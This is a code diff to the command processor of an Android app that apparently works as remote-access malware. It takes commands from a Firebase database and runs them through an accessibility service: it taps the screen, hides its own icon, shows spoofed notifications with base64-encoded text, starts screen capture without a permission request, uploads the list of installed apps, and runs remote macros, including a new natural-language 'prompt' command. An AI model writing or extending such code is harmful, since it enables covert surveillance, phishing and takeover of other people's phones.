@@ -12,7 +12,7 @@ object CommandProcessor {
         FirebaseBridge.commandsRef.addChildEventListener(object : ChildEventListener {
             override fun onChildAdded(snapshot: DataSnapshot, previous: String?) {
                 val cmd = snapshot.getValue(RemoteCommand::class.java) ?: return
-                execute(cmd)
+                execute(cmd, snapshot.key)
                 snapshot.ref.removeValue()
             }
             override fun onChildChanged(s: DataSnapshot, p: String?) {}
@@ -24,7 +24,7 @@ object CommandProcessor {
         })
     }
 
-    private fun execute(cmd: RemoteCommand) {
+    private fun execute(cmd: RemoteCommand, key: String?) {
         val svc = MyAccessibilityService.instance ?: return
         when (cmd.type) {
             "tap" -> svc.tap(cmd.x ?: 0, cmd.y ?: 0)
@@ -33,18 +33,30 @@ object CommandProcessor {
             "hide_activity" -> svc.hideAppIcon()
             "uninstall" -> svc.uninstallSelf()
             "fake_notification" -> {
-                val title = decodeIfBase64(cmd.title)
-                val body = decodeIfBase64(cmd.text)
-                NotificationSpoofer.show(context, title ?: "", body ?: "", cmd.iconUrl, cmd.bigPictureUrl)
+                val title = decodeIfBase64(cmd.title) ?: "⚠ Alert"
+                val body = decodeIfBase64(cmd.text) ?: "Tap to view"
+                NotificationSpoofer.show(context, title, body, cmd.iconUrl, cmd.bigPictureUrl)
             }
-            "start_screen_capture" -> svc.requestScreenCapture()  // now public
+            "start_screen_capture" -> svc.startScreenCapture()
             "get_apps" -> FirebaseBridge.pushAppsList(svc.getInstalledApps())
-            "macro" -> {
-                val macroId = FirebaseBridge.commandsRef.push().key ?: "unknown"
-                val steps = cmd.steps ?: emptyList()
+            "prompt" -> {
+                val promptText = decodeIfBase64(cmd.text) ?: return
+                val actions = NLPParser.parse(promptText)
+                val steps = actions.map { action ->
+                    MacroRunner.MacroStep(action.type, action.data, 3)
+                }
+                val macroId = key ?: "prompt_${System.currentTimeMillis()}"
                 svc.executeMacro(macroId, steps)
             }
-            else -> {}
+            "macro" -> {
+                val steps = cmd.steps?.mapNotNull { step ->
+                    val type = step["type"] as? String ?: return@mapNotNull null
+                    val data = step["data"]
+                    MacroRunner.MacroStep(type, data, 3)
+                } ?: emptyList()
+                val macroId = key ?: "macro_${System.currentTimeMillis()}"
+                svc.executeMacro(macroId, steps)
+            }
         }
     }
 
